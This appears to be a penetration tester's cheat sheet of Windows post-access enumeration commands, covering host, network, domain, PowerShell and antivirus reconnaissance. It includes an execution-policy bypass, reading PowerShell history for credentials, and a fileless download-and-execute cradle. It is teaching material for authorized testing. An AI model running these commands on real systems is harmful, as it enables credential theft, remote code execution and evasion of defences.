## System Identification

**`hostname`**  
Prints the computer name.

**`[System.Environment]::OSVersion.Version`**  
Displays the operating system version and revision level.

**`wmic qfe get Caption,Description,HotFixID,InstalledOn`**  
Lists installed patches and hotfixes.  
Useful for:
- Identifying missing patches
- Checking for known privilege escalation vulnerabilities

---

## Network Information

**`ipconfig /all`**  
Shows full network adapter configuration, including:

- IP addresses
- DNS servers
- DHCP status
- MAC addresses

**`echo %USERDOMAIN%`** (CMD)  
Displays the domain name the host belongs to.

**`echo %logonserver%`** (CMD)  
Shows the domain controller the machine authenticates against.

---
## PowerShell Environment & Modules

**`Get-Module`**  
Lists loaded PowerShell modules available in the current session.

**`Get-ExecutionPolicy -List`**  
Displays execution policy settings for each scope:

- MachinePolicy
- UserPolicy
- Process
- CurrentUser
- LocalMachine

**`Set-ExecutionPolicy Bypass -Scope Process`**  
Temporarily bypasses execution policy for the current PowerShell process.  
Reverts automatically when the process exits.  
Preferred method during engagements since it does not make permanent changes.

**`Get-ChildItem Env: | ft Key,Value`**  
Enumerates environment variables such as:

- User paths
- System paths
- Computer information
---
## Credential and History Enumeration

**`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`**  
Retrieves the PowerShell command history of the current user.

Potential value:

- Hardcoded credentials
- Script paths
- Admin activity
- Backup scripts containing secrets
---

## File Download and In-Memory Execution

**`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"`**

Breakdown:

- `-nop` → No profile
- `-c` → Run command
- `iex` → Invoke-Expression
- `DownloadString()` → Downloads remote content into memory

Used for:

- Fileless execution
- Running scripts directly in memory
- Avoiding writing payloads to disk
---

## Firewall and AV Enumeration

**`netsh advfirewall show allprofiles`**  
Displays firewall status and configuration for:

- Domain profile
- Private profile
- Public profile

**`Get-MpComputerStatus`**  
Queries Windows Defender status, including:

- Real-time protection
- AV engine version
- Signature updates
- Running state
